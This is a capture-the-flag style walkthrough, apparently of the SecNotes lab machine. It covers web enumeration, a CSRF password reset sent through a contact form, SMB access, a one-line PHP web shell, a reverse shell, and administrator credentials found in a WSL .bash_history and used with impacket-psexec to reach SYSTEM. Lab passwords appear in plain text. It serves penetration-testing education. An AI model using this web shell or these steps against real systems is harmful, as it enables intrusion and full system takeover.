## SecNotes

### Lab Details 

- Difficulty: Medium
- Type: Web Enumeration, CSRF, SMB, Credential Harvesting, Priv Esc, Windows

#### Enumeration
- run `nmap`
```bash
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-title: Secure Notes - Login
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)
8808/tcp open  http         Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
```
- visiting port 8808 we get default page for `IIS`
![[port 8808.png]]
- visiting web app on port 80, we get presented with a login form
![[port 80.png]]
- we can `Sign up` and login to the application
![[logged in normal user.png]]
- there is  a contact page that goes to user `tyler`
- we can attempt `CSRF` 
![[contact.png]]
- used `wfuzz` no subdomain found
- `ffuf` found some endpoints, `change_pass.php` allows us to change password
```bash
$ ffuf -u http://secnotes.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://secnotes.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

register.php            [Status: 200, Size: 1569, Words: 427, Lines: 41, Duration: 13ms]
login.php               [Status: 200, Size: 1223, Words: 333, Lines: 35, Duration: 16ms]
contact.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 9ms]
home.php                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 7ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 8ms]
auth.php                [Status: 500, Size: 1208, Words: 70, Lines: 30, Duration: 8ms]
.                       [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 7ms]
db.php                  [Status: 500, Size: 1208, Words: 70, Lines: 30, Duration: 9ms]
Login.php               [Status: 200, Size: 1223, Words: 333, Lines: 35, Duration: 7ms]
Register.php            [Status: 200, Size: 1569, Words: 427, Lines: 41, Duration: 14ms]
Contact.php             [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 5ms]
change_pass.php         [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 6ms]
DB.php                  [Status: 500, Size: 1208, Words: 70, Lines: 30, Duration: 7ms]
Home.php                [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4ms]
Logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 4ms]
LogOut.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 6ms]
```
- we can attempt rest password with `GET` request type, test on `burpsuite` and did not get error response
![[reset password get.png]]
- we can send the request to the contact form and wait for user to click on the link then login as user with the reset password
![[CSRF.png]]
- login with the new password as `tyler`
![[logged in tayler.png]]
- we get the plain text password for user `tyler`
```
\\secnotes.htb\new-site
tyler / 92g!mA8BGjOirkL%OG*&
```
#### Initial Foothold 
- we can `nxc` to enumerate the `SMB` service
```bash
$ nxc smb target 10.129.50.60 -u tyler -p '92g!mA8BGjOirkL%OG*&' --shares
SMB         10.129.50.60    445    SECNOTES         [*] Windows 10 Enterprise 17134 (name:SECNOTES) (domain:SECNOTES) (signing:False) (SMBv1:True)
SMB         10.129.50.60    445    SECNOTES         [+] SECNOTES\tyler:92g!mA8BGjOirkL%OG*& 
SMB         10.129.50.60    445    SECNOTES         [*] Enumerated shares
SMB         10.129.50.60    445    SECNOTES         Share           Permissions     Remark
SMB         10.129.50.60    445    SECNOTES         -----           -----------     ------
SMB         10.129.50.60    445    SECNOTES         ADMIN$                          Remote Admin
SMB         10.129.50.60    445    SECNOTES         C$                              Default share
SMB         10.129.50.60    445    SECNOTES         IPC$                            Remote IPC
SMB         10.129.50.60    445    SECNOTES         new-site        READ,WRITE      
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```
- the output states we have `READ,WRITE` access over `new-site` directory
- the `SMB` server contains the default `IIS` server image and `.htm` file which means that we should be able to fetch the reverse shell at port 8808
- create a web shell and upload to the `SMB` server
```bash
<?php echo shell_exec($_GET["cmd"]); ?>
```
- test the web shell with `http://10.129.102.79:8808/shell.php?cmd=dir`
![[test web shell.png]]
- get a reverse shell with `Reverse Shell Generator` (https://www.revshells.com/)
![[powershell reverse shell payload.png]]
- a reverse shell on `nc` listener
![[Medium/Windows/SecNotes/reverse shell.png]]
#### Lateral Movement (If any)

#### Privilege Escalation
- found a  `Distros` directory
![[distro dir.png]]
- target should have `WSL` installed
- checking if `WSL` is installed
```bash
PS C:\> Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss | %{Get-ItemProperty $_.PSPath} | out-string -width 4096


State             : 1
DistributionName  : Ubuntu-18.04
Version           : 1
BasePath          : C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState
PackageFamilyName : CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc
PSPath            : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Lxss\{02893575-609c-4e3b-a426-00f9d9b271da}
PSParentPath      : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Lxss
PSChildName       : {02893575-609c-4e3b-a426-00f9d9b271da}
PSProvider        : Microsoft.PowerShell.Core\Registry
```
- going to the `rootfs` directory and find that its contains the entire directory for the `Ubuntu` Distro
```bash
PS C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs> ls


    Directory: 
    C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
da----        6/21/2018   6:03 PM                bin                                                                   
da----        6/21/2018   6:00 PM                boot                                                                  
da----        6/21/2018   6:00 PM                dev                                                                   
da----        6/22/2018   3:00 AM                etc                                                                   
da----        6/21/2018   6:00 PM                home                                                                  
da----        6/21/2018   6:00 PM                lib                                                                   
da----        6/21/2018   6:00 PM                lib64                                                                 
da----        6/21/2018   6:00 PM                media                                                                 
da----        6/21/2018   6:03 PM                mnt                                                                   
da----        6/21/2018   6:00 PM                opt                                                                   
da----        6/21/2018   6:00 PM                proc                                                                  
da----        6/22/2018   2:44 PM                root                                                                  
da----        6/21/2018   6:00 PM                run                                                                   
da----        6/22/2018   2:57 AM                sbin                                                                  
da----        6/21/2018   6:00 PM                snap                                                                  
da----        6/21/2018   6:00 PM                srv                                                                   
da----        6/21/2018   6:00 PM                sys                                                                   
da----        6/22/2018   2:25 PM                tmp                                                                   
da----        6/21/2018   6:02 PM                usr                                                                   
da----        6/21/2018   6:03 PM                var                                                                   
-a----        6/22/2018   2:25 PM          87944 init        
```
- looking for interesting files and found admin credential in root user's `.bash_history`
```bash
PS C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc\LocalState\rootfs\root> cat .bash_history
cd /mnt/c/
ls
cd Users/
cd /
cd ~
ls
pwd
mkdir filesystem
mount //127.0.0.1/c$ filesystem/
sudo apt install cifs-utils
mount //127.0.0.1/c$ filesystem/
mount //127.0.0.1/c$ filesystem/ -o user=administrator
cat /proc/filesystems
sudo modprobe cifs
smbclient
apt install smbclient
smbclient
smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\127.0.0.1\\c$
> .bash_history 
less .bash_history
exit
```
- use `impacket-psexec` to get RCE as `NT Authority\System`
```bash
$ impacket-psexec 'administrator:u6!4ZwgwOM#^OBf#Nwnh@10.129.102.79'
Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.102.79.....
[*] Found writable share ADMIN$
[*] Uploading file dUfTLsFR.exe
[*] Opening SVCManager on 10.129.102.79.....
[*] Creating service MSWX on 10.129.102.79.....
[*] Starting service MSWX.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17134.228]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami
nt authority\system
```
#### Resources

#### Lesson Learned
